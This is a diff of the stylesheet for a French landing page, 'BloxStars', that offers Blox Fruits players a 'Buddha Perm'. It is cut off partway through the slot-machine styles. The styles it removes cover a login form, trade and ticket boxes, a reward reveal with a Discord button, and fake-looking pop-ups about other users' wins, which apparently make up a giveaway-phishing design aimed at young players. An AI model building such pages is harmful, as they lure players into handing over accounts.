@@ -1,1053 +1,1005 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Blox Stars — Analytics d'Entraînement Blox Fruits</title>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>BloxStars — Obtenez votre Buddha Perm</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=DM+Sans:wght@300;400;500;600&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
 <style>
-:root {
-  --bg: #080a0f;
-  --bg2: #0c0f1a;
-  --surface: #111520;
-  --surface2: #161b28;
-  --accent: #00d4ff;
-  --accent-dim: rgba(0,212,255,0.12);
-  --accent-border: rgba(0,212,255,0.28);
-  --gold: #f5c842;
-  --gold-dim: rgba(245,200,66,0.15);
-  --gold-border: rgba(245,200,66,0.4);
-  --text: #e8eaf2;
-  --text2: #9399b0;
-  --text3: #4a5068;
-  --border: rgba(255,255,255,0.06);
-  --border2: rgba(255,255,255,0.1);
+:root{
+  --black:#06070d;
+  --dark:#0b0d17;
+  --card:#10121e;
+  --card2:#161929;
+  --gold:#f0b429;
+  --gold2:#ffdd6b;
+  --orange:#ff6b1a;
+  --red:#ff2d55;
+  --cyan:#00e5ff;
+  --text:#eceef8;
+  --muted:#6b7194;
+  --border:rgba(255,255,255,0.07);
 }
-* { margin:0; padding:0; box-sizing:border-box; }
-html { scroll-behavior:smooth; }
-body {
-  font-family:'Inter',-apple-system,sans-serif;
-  background:var(--bg);
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:'DM Sans',sans-serif;
+  background:var(--black);
   color:var(--text);
   overflow-x:hidden;
-  -webkit-font-smoothing:antialiased;
+  cursor:default;
 }
-body::after {
-  content:'';
-  position:fixed;
-  top:-300px;
-  left:50%;
-  transform:translateX(-50%);
-  width:800px;
-  height:600px;
-  border-radius:50%;
-  background:radial-gradient(ellipse,rgba(0,212,255,0.08) 0%,transparent 70%);
-  pointer-events:none;
-  z-index:0;
-}
-.wrap { width:90%; max-width:1060px; margin:auto; position:relative; z-index:1; }
 
-/* NAV */
-nav {
-  position:fixed; top:0; width:100%; z-index:200;
+/* ---- CUSTOM CURSOR ---- */
+.cursor{
+  position:fixed;width:12px;height:12px;
+  background:var(--gold);border-radius:50%;
+  pointer-events:none;z-index:9999;
+  transform:translate(-50%,-50%);
+  transition:transform .1s,width .2s,height .2s,opacity .2s;
+  mix-blend-mode:difference;
+}
+.cursor-ring{
+  position:fixed;width:36px;height:36px;
+  border:1px solid rgba(240,180,41,0.5);border-radius:50%;
+  pointer-events:none;z-index:9998;
+  transform:translate(-50%,-50%);
+  transition:transform .15s ease-out,width .2s,height .2s;
+}
+
+/* ---- NOISE TEXTURE ---- */
+body::before{
+  content:'';position:fixed;inset:0;
+  background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.03'/%3E%3C/svg%3E");
+  pointer-events:none;z-index:0;opacity:0.4;
+}
+
+/* ---- GRID BG ---- */
+body::after{
+  content:'';position:fixed;inset:0;
+  background-image:
+    linear-gradient(rgba(240,180,41,0.03) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(240,180,41,0.03) 1px,transparent 1px);
+  background-size:60px 60px;
+  pointer-events:none;z-index:0;
+}
+
+/* ---- NAV ---- */
+nav{
+  position:fixed;top:0;width:100%;z-index:500;
+  padding:0 5%;height:60px;
+  display:flex;align-items:center;justify-content:space-between;
   border-bottom:1px solid var(--border);
-  backdrop-filter:blur(24px);
-  background:rgba(8,10,15,0.82);
-}
-.nav-inner { display:flex; justify-content:space-between; align-items:center; height:54px; }
-.logo { font-family:'Syne',sans-serif; font-size:15px; font-weight:800; letter-spacing:0.08em; color:var(--text); cursor:pointer; }
-.logo b { color:var(--accent); }
-.nav-links { display:flex; align-items:center; gap:30px; }
-.nav-links a { font-size:13px; color:var(--text2); text-decoration:none; font-weight:400; transition:color .15s; }
-.nav-links a:hover { color:var(--text); }
-.nav-roblox {
-  display:inline-flex; align-items:center; gap:6px;
-  background:#fff; color:#000;
-  font-size:13px; font-weight:700; padding:7px 15px;
-  border-radius:7px; text-decoration:none; transition:opacity .15s;
-  font-family:'Syne',sans-serif;
-}
-.nav-roblox:hover { opacity:.85; }
-
-/* SPECIAL OFFER BANNER */
-.offer-banner {
-  position:relative; z-index:100;
-  margin-top:54px;
-  background: linear-gradient(90deg, #1a1200, #2a1f00, #1a1200);
-  border-bottom: 1px solid var(--gold-border);
-  padding:10px 0;
-  overflow:hidden;
-}
-.offer-banner::before {
-  content:'';
-  position:absolute; top:0; left:-100%;
-  width:60%; height:100%;
-  background:linear-gradient(90deg, transparent, rgba(245,200,66,0.08), transparent);
-  animation: shine 3s ease-in-out infinite;
-}
-@keyframes shine {
-  0% { left:-100%; }
-  100% { left:200%; }
-}
-.offer-inner {
-  display:flex; align-items:center; justify-content:center; gap:14px;
-  flex-wrap:wrap;
-}
-.offer-badge {
-  background:var(--gold);
-  color:#000;
-  font-family:'Syne',sans-serif;
-  font-size:10px; font-weight:800;
-  letter-spacing:.12em; text-transform:uppercase;
-  padding:3px 10px; border-radius:100px;
-  animation: pulse-gold 2s ease-in-out infinite;
-}
-@keyframes pulse-gold {
-  0%,100% { box-shadow: 0 0 0 0 rgba(245,200,66,0.4); }
-  50% { box-shadow: 0 0 0 6px rgba(245,200,66,0); }
-}
-.offer-text {
-  font-size:13px; font-weight:500; color:var(--gold);
-  font-family:'Syne',sans-serif;
-}
-.offer-text span { color:var(--text2); font-size:12px; font-family:'Inter',sans-serif; }
-.offer-btn {
-  background:var(--gold); color:#000;
-  font-size:12px; font-weight:700;
-  padding:5px 14px; border-radius:6px;
-  border:none; cursor:pointer;
-  font-family:'Syne',sans-serif;
-  transition:opacity .15s;
-  text-decoration:none;
-  display:inline-flex; align-items:center; gap:5px;
-}
-.offer-btn:hover { opacity:.85; }
-
-/* HERO */
-.hero { padding:80px 0 72px; text-align:center; position:relative; }
-.eyebrow {
-  display:inline-flex; align-items:center; gap:7px;
-  border:1px solid var(--border2); padding:5px 14px;
-  border-radius:100px; font-size:12px; font-weight:500;
-  color:var(--text2); margin-bottom:28px; letter-spacing:0.01em;
-}
-.eyebrow-dot { width:5px; height:5px; border-radius:50%; background:var(--accent); flex-shrink:0; }
-.hero h1 {
-  font-family:'Syne',sans-serif;
-  font-size:clamp(30px,4vw,52px); font-weight:800;
-  letter-spacing:-0.03em; line-height:1.1;
-  max-width:620px; margin:0 auto 18px; color:var(--text);
-}
-.hero h1 em { font-style:normal; color:var(--accent); }
-.hero-sub {
-  font-size:15px; color:var(--text2); max-width:420px;
-  margin:0 auto 32px; line-height:1.65; font-weight:400;
-}
-.hero-btns { display:flex; gap:9px; justify-content:center; margin-bottom:0; }
-.bp {
-  display:inline-flex; align-items:center; gap:7px;
-  background:var(--accent); color:#fff;
-  font-size:13.5px; font-weight:600; padding:10px 22px;
-  border-radius:8px; text-decoration:none; transition:opacity .15s, transform .15s;
-  font-family:'Syne',sans-serif;
-}
-.bp:hover { opacity:.88; transform:translateY(-1px); }
-.bs {
-  display:inline-flex; align-items:center; gap:7px;
-  background:transparent; color:var(--text2);
-  font-size:13.5px; font-weight:500; padding:10px 20px;
-  border-radius:8px; border:1px solid var(--border2); text-decoration:none;
-  transition:all .15s;
-}
-.bs:hover { color:var(--text); border-color:rgba(255,255,255,.18); background:rgba(255,255,255,.03); }
-.br {
-  display:inline-flex; align-items:center; gap:7px;
-  background:#fff; color:#000;
-  font-size:13.5px; font-weight:700; padding:10px 22px;
-  border-radius:8px; text-decoration:none; transition:opacity .15s, transform .15s;
-  font-family:'Syne',sans-serif;
-}
-.br:hover { opacity:.88; transform:translateY(-1px); }
-
-/* TRUST */
-.trust {
-  border-top:1px solid var(--border); border-bottom:1px solid var(--border);
-  padding:22px 0; position:relative; z-index:1;
-}
-.trust-in { display:flex; align-items:center; justify-content:center; gap:44px; flex-wrap:wrap; }
-.t-item { text-align:center; }
-.t-num {
-  font-size:21px; font-weight:700; letter-spacing:-0.04em;
-  line-height:1; margin-bottom:3px; color:var(--text);
-  font-family:'Syne',sans-serif;
-}
-.t-num.loading { color:var(--text3); }
-.t-lbl { font-size:11.5px; color:var(--text3); }
-.t-sep { width:1px; height:26px; background:var(--border); }
-.t-pill {
-  display:inline-flex; align-items:center; gap:6px;
-  background:var(--accent-dim); border:1px solid var(--accent-border);
-  padding:5px 12px; border-radius:100px;
-  font-size:12px; color:#7dd3fc; font-weight:500;
-}
-
-/* SECTION BASE */
-.sec { padding:96px 0; position:relative; z-index:1; }
-.sec.alt { background:rgba(255,255,255,0.015); }
-.stag { font-size:11px; font-weight:700; letter-spacing:.12em; text-transform:uppercase; color:var(--accent); margin-bottom:10px; font-family:'Syne',sans-serif; }
-.sh { font-family:'Syne',sans-serif; font-size:clamp(24px,3vw,36px); font-weight:700; letter-spacing:-.03em; line-height:1.15; color:var(--text); margin-bottom:12px; }
-.sp { font-size:14.5px; color:var(--text2); line-height:1.7; font-weight:400; max-width:460px; }
-
-/* STORY */
-.story-g { display:grid; grid-template-columns:1fr 1fr; gap:80px; align-items:center; }
-.story-steps { display:flex; flex-direction:column; gap:0; margin-top:32px; position:relative; }
-.story-steps::before {
-  content:''; position:absolute;
-  left:10px; top:12px; bottom:12px; width:1px; background:var(--border2);
-}
-.step { display:flex; gap:16px; align-items:flex-start; padding-bottom:26px; position:relative; }
-.step:last-child { padding-bottom:0; }
-.step-d {
-  width:21px; height:21px; border-radius:50%;
-  background:var(--surface2); border:1px solid var(--border2);
-  flex-shrink:0; position:relative; z-index:1;
-  display:flex; align-items:center; justify-content:center;
-}
-.step-d::after { content:''; width:6px; height:6px; border-radius:50%; background:var(--accent); }
-.step-b strong { display:block; font-size:13.5px; font-weight:600; color:var(--text); margin-bottom:2px; letter-spacing:-.01em; font-family:'Syne',sans-serif; }
-.step-b span { font-size:13px; color:var(--text2); line-height:1.55; }
-.story-img { width:100%; border-radius:14px; box-shadow:0 0 0 1px rgba(255,255,255,0.07), 0 30px 70px rgba(0,0,0,0.6); }
-
-/* FEATURE GRID */
-.feat-hd { text-align:center; max-width:520px; margin:0 auto 48px; }
-.feat-hd .sp { margin:0 auto; }
-.feat-g {
-  display:grid; grid-template-columns:repeat(3,1fr);
-  gap:1px; border:1px solid var(--border); border-radius:13px;
-  overflow:hidden; background:var(--border);
-}
-.feat { background:var(--surface); padding:26px 24px; transition:background .2s; }
-.feat:hover { background:var(--surface2); }
-.feat-ic {
-  width:34px; height:34px; background:var(--accent-dim);
-  border-radius:8px; display:flex; align-items:center;
-  justify-content:center; margin-bottom:13px; color:#7dd3fc;
-}
-.feat h3 { font-family:'Syne',sans-serif; font-size:13.5px; font-weight:700; color:var(--text); margin-bottom:5px; }
-.feat p { font-size:12.5px; color:var(--text2); line-height:1.6; }
-
-/* SHOWCASE */
-.sc-item { display:grid; grid-template-columns:1fr 1fr; gap:64px; align-items:center; margin-bottom:72px; }
-.sc-item:last-child { margin-bottom:0; }
-.sc-item.rev { direction:rtl; }
-.sc-item.rev > * { direction:ltr; }
-.sc-img { width:100%; border-radius:14px; box-shadow:0 0 0 1px rgba(255,255,255,0.07), 0 24px 60px rgba(0,0,0,0.55); }
-.sc-text .sp { margin-top:10px; }
-
-/* VIDEO */
-.vid-hd { text-align:center; max-width:500px; margin:0 auto; }
-.vid-hd .sp { margin:0 auto; }
-.vid-frame {
-  background:var(--surface); border:1px solid var(--border);
-  border-radius:13px; padding:4px;
-  box-shadow:0 28px 70px rgba(0,0,0,.5); margin-top:44px;
-}
-.vid-bar { display:flex; align-items:center; gap:6px; padding:9px 13px; }
-.vid-bar s { display:block; width:8px; height:8px; border-radius:50%; background:rgba(255,255,255,.08); text-decoration:none; }
-
-/* CTA */
-.cta-sec { text-align:center; padding:110px 0; position:relative; z-index:1; }
-.cta-sec::before {
-  content:''; position:absolute;
-  top:50%; left:50%; transform:translate(-50%,-50%);
-  width:480px; height:380px; border-radius:50%;
-  background:radial-gradient(ellipse,rgba(0,212,255,0.07) 0%,transparent 70%);
-  pointer-events:none;
-}
-.cta-btns { display:flex; gap:9px; justify-content:center; }
-
-/* FOOTER */
-footer { border-top:1px solid var(--border); padding:26px 0; position:relative; z-index:1; }
-.foot-in { display:flex; justify-content:space-between; align-items:center; }
-.foot-copy { font-size:12px; color:var(--text3); }
-.foot-links { display:flex; gap:22px; }
-.foot-links a { font-size:12px; color:var(--text3); text-decoration:none; transition:color .15s; }
-.foot-links a:hover { color:var(--text2); }
-
-/* ===================== MODAL OVERLAY ===================== */
-.modal-overlay {
-  position:fixed; top:0; left:0; width:100%; height:100%;
-  background:rgba(0,0,0,0.85); backdrop-filter:blur(12px);
-  z-index:1000; display:none; align-items:center; justify-content:center;
-}
-.modal-overlay.active { display:flex; }
-
-/* LOGIN MODAL */
-.modal {
-  background:var(--surface); border:1px solid var(--border);
-  border-radius:20px; padding:36px; max-width:440px; width:92%;
-  box-shadow:0 40px 100px rgba(0,0,0,0.6);
-  position:relative;
-}
-.modal h2 { font-family:'Syne',sans-serif; font-size:22px; font-weight:700; color:var(--text); margin-bottom:8px; }
-.modal p { font-size:14px; color:var(--text2); margin-bottom:20px; line-height:1.6; }
-.modal input {
-  width:100%; padding:12px 16px; margin-bottom:12px;
-  background:var(--surface2); border:1px solid var(--border2);
-  border-radius:10px; color:var(--text); font-size:14px;
-  outline:none; transition:border-color .15s; font-family:'Inter',sans-serif;
-}
-.modal input:focus { border-color:var(--accent); }
-.modal-btn {
-  width:100%; padding:13px; background:var(--accent);
-  color:#fff; border:none; border-radius:10px; font-size:14px;
-  font-weight:700; cursor:pointer; transition:opacity .15s, transform .15s;
-  font-family:'Syne',sans-serif; letter-spacing:.02em;
-}
-.modal-btn:hover { opacity:.88; transform:translateY(-1px); }
-.modal-close {
-  position:absolute; top:16px; right:18px;
-  background:none; border:none; color:var(--text3);
-  font-size:22px; cursor:pointer; transition:color .15s; line-height:1;
-}
-.modal-close:hover { color:var(--text); }
-.trade-info {
-  background:var(--accent-dim); border:1px solid var(--accent-border);
-  border-radius:10px; padding:14px; margin-bottom:16px;
-}
-.trade-info h3 { font-family:'Syne',sans-serif; font-size:12px; font-weight:700; color:var(--accent); margin-bottom:6px; letter-spacing:.04em; }
-.trade-info p { font-size:12px; color:var(--text2); margin:0; line-height:1.5; }
-.ticket-info {
-  background:rgba(245,200,66,0.08); border:1px solid rgba(245,200,66,0.3);
-  border-radius:10px; padding:14px; margin-bottom:16px;
-}
-.ticket-info h3 { font-family:'Syne',sans-serif; font-size:12px; font-weight:700; color:var(--gold); margin-bottom:6px; letter-spacing:.04em; }
-.ticket-info p { font-size:12px; color:var(--text2); margin:0; line-height:1.5; }
-
-/* ===================== REWARD MODAL ===================== */
-.reward-overlay {
-  position:fixed; top:0; left:0; width:100%; height:100%;
-  background:rgba(0,0,0,0); backdrop-filter:blur(0px);
-  z-index:2000; display:none; align-items:center; justify-content:center;
-  flex-direction:column;
-  transition: background 0.8s ease, backdrop-filter 0.8s ease;
-}
-.reward-overlay.active { display:flex; }
-.reward-overlay.show {
-  background:rgba(0,0,0,0.92);
+  background:rgba(6,7,13,0.9);
   backdrop-filter:blur(20px);
 }
+.nav-logo{
+  font-family:'Bebas Neue',sans-serif;
+  font-size:22px;letter-spacing:.12em;color:var(--text);
+}
+.nav-logo span{color:var(--gold);}
+.nav-right{display:flex;align-items:center;gap:20px;}
+.nav-link{font-size:13px;color:var(--muted);text-decoration:none;transition:color .15s;font-weight:500;}
+.nav-link:hover{color:var(--text);}
+.nav-cta{
+  font-family:'Space Mono',monospace;
+  font-size:12px;font-weight:700;
+  background:var(--gold);color:#000;
+  padding:8px 18px;border-radius:4px;
+  text-decoration:none;border:none;cursor:pointer;
+  transition:transform .15s,box-shadow .15s;
+  letter-spacing:.04em;
+}
+.nav-cta:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(240,180,41,0.35);}
 
-/* Particles */
-.particles-container {
-  position:fixed; top:0; left:0; width:100%; height:100%;
-  pointer-events:none; z-index:2001; overflow:hidden;
-}
-.particle {
-  position:absolute;
-  width:8px; height:8px;
-  border-radius:50%;
-  opacity:0;
-}
-
-/* Reveal box */
-.reward-box {
-  position:relative; z-index:2002;
-  text-align:center;
-  opacity:0; transform:scale(0.7) translateY(40px);
-  transition: opacity 0.6s cubic-bezier(0.34, 1.56, 0.64, 1), transform 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
-}
-.reward-box.show {
-  opacity:1; transform:scale(1) translateY(0);
-}
-
-.reward-title-top {
-  font-family:'Syne',sans-serif;
-  font-size:13px; font-weight:700;
-  letter-spacing:.2em; text-transform:uppercase;
-  color:var(--gold); margin-bottom:16px;
-  opacity:0; transform:translateY(-10px);
-  transition: opacity 0.4s ease 0.3s, transform 0.4s ease 0.3s;
-}
-.reward-box.show .reward-title-top { opacity:1; transform:translateY(0); }
-
-/* The fruit card */
-.fruit-card {
-  background: linear-gradient(145deg, #1a1400, #231c00, #1a1400);
-  border: 2px solid var(--gold-border);
-  border-radius:24px;
-  padding:40px 48px;
-  box-shadow:
-    0 0 0 1px rgba(245,200,66,0.1),
-    0 0 60px rgba(245,200,66,0.15),
-    0 40px 80px rgba(0,0,0,0.8);
-  position:relative;
+/* ---- BANNER ---- */
+.banner{
+  position:relative;z-index:1;
+  margin-top:60px;
+  background:linear-gradient(90deg,#1c1100,#231500,#1c1100);
+  border-bottom:1px solid rgba(240,180,41,0.25);
+  padding:11px 5%;
+  display:flex;align-items:center;justify-content:center;gap:16px;
   overflow:hidden;
-  min-width:320px;
 }
-.fruit-card::before {
-  content:'';
-  position:absolute; top:-50%; left:-50%;
-  width:200%; height:200%;
-  background: conic-gradient(from 0deg, transparent 0deg, rgba(245,200,66,0.05) 60deg, transparent 120deg);
-  animation: rotate-glow 4s linear infinite;
+.banner::before{
+  content:'';position:absolute;top:0;left:-100%;
+  width:50%;height:100%;
+  background:linear-gradient(90deg,transparent,rgba(240,180,41,0.07),transparent);
+  animation:bannerShine 3s ease-in-out infinite;
 }
-@keyframes rotate-glow {
-  from { transform:rotate(0deg); }
-  to { transform:rotate(360deg); }
+@keyframes bannerShine{0%{left:-100%}100%{left:200%}}
+.banner-pill{
+  font-family:'Space Mono',monospace;
+  font-size:9px;font-weight:700;letter-spacing:.15em;text-transform:uppercase;
+  background:var(--gold);color:#000;
+  padding:3px 10px;border-radius:2px;white-space:nowrap;
 }
-.fruit-card::after {
-  content:'';
-  position:absolute; top:0; left:0; right:0;
-  height:1px;
-  background:linear-gradient(90deg, transparent, var(--gold), transparent);
-  opacity:0.6;
+.banner-text{font-size:13px;font-weight:500;color:var(--gold);}
+.banner-text em{color:var(--muted);font-style:normal;font-size:12px;}
+.banner-btn{
+  font-family:'Space Mono',monospace;
+  font-size:11px;font-weight:700;letter-spacing:.06em;
+  background:transparent;border:1px solid var(--gold);
+  color:var(--gold);padding:5px 14px;border-radius:3px;
+  cursor:pointer;transition:all .15s;white-space:nowrap;
 }
+.banner-btn:hover{background:var(--gold);color:#000;}
 
-.perm-badge {
-  display:inline-flex; align-items:center; gap:5px;
-  background:var(--gold); color:#000;
-  font-family:'Syne',sans-serif;
-  font-size:10px; font-weight:800;
-  letter-spacing:.15em; text-transform:uppercase;
-  padding:4px 12px; border-radius:100px;
-  margin-bottom:24px;
-  position:relative; z-index:1;
+/* ---- HERO ---- */
+.hero{
+  position:relative;z-index:1;
+  min-height:100vh;
+  display:flex;align-items:center;
+  padding:100px 5% 60px;
+  overflow:hidden;
 }
-
-.fruit-image-container {
-  position:relative; z-index:1;
-  margin:0 auto 24px;
-  width:140px; height:140px;
-  display:flex; align-items:center; justify-content:center;
-}
-.fruit-glow {
-  position:absolute; inset:-20px;
-  background:radial-gradient(circle, rgba(245,200,66,0.3) 0%, transparent 70%);
-  animation: pulse-fruit 2s ease-in-out infinite;
-}
-@keyframes pulse-fruit {
-  0%,100% { transform:scale(1); opacity:1; }
-  50% { transform:scale(1.1); opacity:0.7; }
-}
-.fruit-img {
-  width:120px; height:120px;
-  object-fit:contain;
-  position:relative; z-index:1;
-  filter:drop-shadow(0 0 20px rgba(245,200,66,0.5));
-  animation: float-fruit 3s ease-in-out infinite;
-}
-@keyframes float-fruit {
-  0%,100% { transform:translateY(0) rotate(-2deg); }
-  50% { transform:translateY(-8px) rotate(2deg); }
-}
-
-.fruit-name {
-  font-family:'Syne',sans-serif;
-  font-size:32px; font-weight:800;
-  color:var(--gold);
-  letter-spacing:-.02em;
-  position:relative; z-index:1;
-  margin-bottom:4px;
-  text-shadow:0 0 30px rgba(245,200,66,0.5);
-}
-.fruit-type {
-  font-size:13px; color:var(--text2);
-  position:relative; z-index:1;
-  margin-bottom:24px; font-weight:500;
-}
-
-.reward-steps {
-  background:rgba(0,0,0,0.3);
-  border:1px solid rgba(255,255,255,0.06);
-  border-radius:12px; padding:16px;
-  text-align:left; position:relative; z-index:1;
-  margin-bottom:20px;
-}
-.reward-step-row {
-  display:flex; align-items:center; gap:10px;
-  font-size:12.5px; color:var(--text2);
-  padding:4px 0;
-}
-.reward-step-row .check {
-  width:18px; height:18px; border-radius:50%;
-  background:rgba(0,255,120,0.15); border:1px solid rgba(0,255,120,0.4);
-  display:flex; align-items:center; justify-content:center;
-  flex-shrink:0; font-size:10px; color:#4ade80;
-}
-
-.reward-discord-btn {
-  width:100%; padding:14px;
-  background:linear-gradient(135deg, #5865F2, #4752c4);
-  color:#fff; border:none; border-radius:12px;
-  font-size:14px; font-weight:700;
-  cursor:pointer; transition:opacity .15s, transform .15s;
-  font-family:'Syne',sans-serif;
-  display:flex; align-items:center; justify-content:center; gap:8px;
-  position:relative; z-index:1;
-}
-.reward-discord-btn:hover { opacity:.9; transform:translateY(-1px); }
-.reward-discord-btn svg { width:18px; height:18px; }
-
-/* Confetti burst */
-.confetti {
-  position:absolute;
-  width:6px; height:6px;
-  opacity:0;
+.hero-bg-fruit{
+  position:absolute;right:-5%;top:50%;transform:translateY(-50%);
+  width:55%;max-width:700px;
+  opacity:0.07;
+  filter:blur(2px) saturate(2);
   pointer-events:none;
 }
+.hero-glow{
+  position:absolute;right:10%;top:50%;transform:translateY(-50%);
+  width:500px;height:500px;border-radius:50%;
+  background:radial-gradient(circle,rgba(240,180,41,0.12) 0%,transparent 70%);
+  pointer-events:none;
+}
+.hero-content{max-width:680px;position:relative;}
+.hero-eyebrow{
+  display:inline-flex;align-items:center;gap:8px;
+  font-family:'Space Mono',monospace;
+  font-size:11px;font-weight:700;letter-spacing:.14em;text-transform:uppercase;
+  color:var(--gold);margin-bottom:20px;
+}
+.hero-eyebrow-dot{width:6px;height:6px;border-radius:50%;background:var(--gold);animation:blink 2s ease-in-out infinite;}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
+h1{
+  font-family:'Bebas Neue',sans-serif;
+  font-size:clamp(56px,7vw,100px);
+  line-height:.95;letter-spacing:.02em;
+  color:var(--text);margin-bottom:20px;
+}
+h1 .gold{color:var(--gold);}
+h1 .stroke{
+  -webkit-text-stroke:2px var(--text);
+  color:transparent;
+}
+.hero-sub{
+  font-size:16px;color:var(--muted);
+  line-height:1.7;max-width:480px;margin-bottom:36px;
+  font-weight:400;
+}
+.hero-sub strong{color:var(--text);}
+.hero-btns{display:flex;gap:12px;flex-wrap:wrap;}
+.btn-primary{
+  font-family:'Space Mono',monospace;
+  font-size:13px;font-weight:700;letter-spacing:.04em;
+  background:var(--gold);color:#000;
+  padding:14px 28px;border-radius:4px;
+  border:none;cursor:pointer;
+  display:inline-flex;align-items:center;gap:8px;
+  transition:transform .15s,box-shadow .15s;
+  text-decoration:none;
+}
+.btn-primary:hover{transform:translateY(-2px);box-shadow:0 12px 32px rgba(240,180,41,0.4);}
+.btn-secondary{
+  font-family:'Space Mono',monospace;
+  font-size:13px;font-weight:700;letter-spacing:.04em;
+  background:transparent;color:var(--text);
+  padding:14px 28px;border-radius:4px;
+  border:1px solid var(--border);cursor:pointer;
+  display:inline-flex;align-items:center;gap:8px;
+  transition:all .15s;text-decoration:none;
+}
+.btn-secondary:hover{border-color:rgba(255,255,255,0.2);background:rgba(255,255,255,0.04);}
 
-/* NOTIFICATION SYSTEM */
-.notification-container {
-  position:fixed; left:20px; top:50%; transform:translateY(-50%);
-  z-index:500; display:flex; flex-direction:column; gap:12px;
-  max-height:80vh; overflow:hidden; pointer-events:none;
+/* hero stats */
+.hero-stats{
+  display:flex;gap:32px;margin-top:48px;padding-top:32px;
+  border-top:1px solid var(--border);flex-wrap:wrap;
 }
-.notification {
-  background:var(--surface); border:1px solid var(--accent-border);
-  border-radius:12px; padding:14px; min-width:270px;
-  box-shadow:0 8px 32px rgba(0,0,0,0.4);
-  animation: slideIn 0.5s ease, fadeOut 0.5s ease 4.5s forwards;
-  pointer-events:auto;
+.hstat-num{
+  font-family:'Bebas Neue',sans-serif;
+  font-size:36px;letter-spacing:.04em;color:var(--gold);
+  line-height:1;margin-bottom:4px;
 }
-.notification-content { display:flex; align-items:center; gap:10px; }
-.notification-icon {
-  width:36px; height:36px; border-radius:8px;
-  background:var(--accent-dim); display:flex;
-  align-items:center; justify-content:center; font-size:18px; flex-shrink:0;
-}
-.notification-user { font-weight:600; color:var(--accent); font-size:12px; margin-bottom:3px; font-family:'Syne',sans-serif; }
-.notification-message { font-size:11.5px; color:var(--text2); line-height:1.4; }
-@keyframes slideIn {
-  from { opacity:0; transform:translateX(-30px); }
-  to { opacity:1; transform:translateX(0); }
-}
-@keyframes fadeOut {
-  from { opacity:1; }
-  to { opacity:0; }
-}
+.hstat-lbl{font-size:12px;color:var(--muted);font-weight:500;letter-spacing:.02em;}
 
-/* SKELETON */
-.skeleton {
-  background: linear-gradient(90deg, var(--surface2) 25%, var(--surface) 50%, var(--surface2) 75%);
-  background-size: 200% 100%;
-  animation: skeleton-loading 1.5s ease-in-out infinite;
+/* ---- WHO WE ARE ---- */
+.section{position:relative;z-index:1;padding:100px 5%;}
+.section-tag{
+  font-family:'Space Mono',monospace;
+  font-size:10px;font-weight:700;letter-spacing:.2em;text-transform:uppercase;
+  color:var(--gold);margin-bottom:14px;
 }
-@keyframes skeleton-loading {
-  0% { background-position: 200% 0; }
-  100% { background-position: -200% 0; }
+.section-title{
+  font-family:'Bebas Neue',sans-serif;
+  font-size:clamp(36px,5vw,60px);letter-spacing:.03em;
+  line-height:1;color:var(--text);margin-bottom:16px;
 }
-.img-wrapper {
-  position: relative; width: 100%; min-height: 300px;
-  background: var(--surface2); border-radius: 16px; overflow: hidden;
-}
-.img-wrapper img {
-  position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-  object-fit: cover; opacity: 0; transition: opacity 0.3s ease;
-}
-.img-wrapper img.loaded { opacity: 1; }
-.img-wrapper .skeleton { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
-.img-wrapper .skeleton.hidden { display: none; }
+.section-sub{font-size:15px;color:var(--muted);line-height:1.7;max-width:500px;}
 
-/* REVEAL */
-.rv { opacity:0; transform:translateY(18px); transition:opacity .6s ease, transform .6s ease; }
-.rv.on { opacity:1; transform:none; }
+.who-grid{
+  display:grid;grid-template-columns:1fr 1fr;
+  gap:2px;margin-top:48px;
+  border:1px solid var(--border);border-radius:8px;overflow:hidden;
+  background:var(--border);
+}
+.who-card{
+  background:var(--card);padding:32px 28px;
+  transition:background .2s;
+}
+.who-card:hover{background:var(--card2);}
+.who-icon{
+  width:40px;height:40px;background:rgba(240,180,41,0.1);
+  border:1px solid rgba(240,180,41,0.2);border-radius:6px;
+  display:flex;align-items:center;justify-content:center;
+  margin-bottom:16px;font-size:20px;
+}
+.who-card h3{
+  font-family:'Bebas Neue',sans-serif;
+  font-size:22px;letter-spacing:.06em;color:var(--text);margin-bottom:8px;
+}
+.who-card p{font-size:13.5px;color:var(--muted);line-height:1.65;}
+
+/* ---- SPIN SECTION ---- */
+.spin-section{
+  position:relative;z-index:1;
+  padding:100px 5%;
+  background:linear-gradient(180deg,transparent,rgba(240,180,41,0.03),transparent);
+  border-top:1px solid var(--border);border-bottom:1px solid var(--border);
+}
+.spin-wrapper{
+  display:grid;grid-template-columns:1fr 1fr;
+  gap:60px;align-items:center;
+}
+.spin-left{}
+.spin-desc{font-size:14px;color:var(--muted);line-height:1.75;margin-top:16px;max-width:420px;}
+
+/* The slot machine */
+.slot-machine{
+  background:var(--card);
+  border:1px solid var(--border);
+  border-radius:12px;padding:28px;
+  position:relative;overflow:hidden;
+}
+.slot-machine::before{
+  content:'';position:absolute;top:0;left:0;right:0;height:1px;
+  background:linear-gradient(90deg,transparent,var(--gold),transparent);
+  opacity:.5;
+}
+.slot-header{
+  font-family:'Space Mono',monospace;
+  font-size:10px;font-weight:700;letter-spacing:.15em;text-transform:uppercase;
+  color:var(--muted);text-align:center;margin-bottom:20px;
+}
+.slot-display{
+  height:80px;background:var(--dark);
+  border:1px solid rgba(255,255,255,0.06);border-radius:8px;
+  display:flex;align-items:center;justify-content:center;
+  overflow:hidden;position:relative;margin-bottom:20px;
+}
+.slot-display::before,.slot-display::after{
+  content:'';position:absolute;left:0;right:0;height:28px;z-index:2;
+}
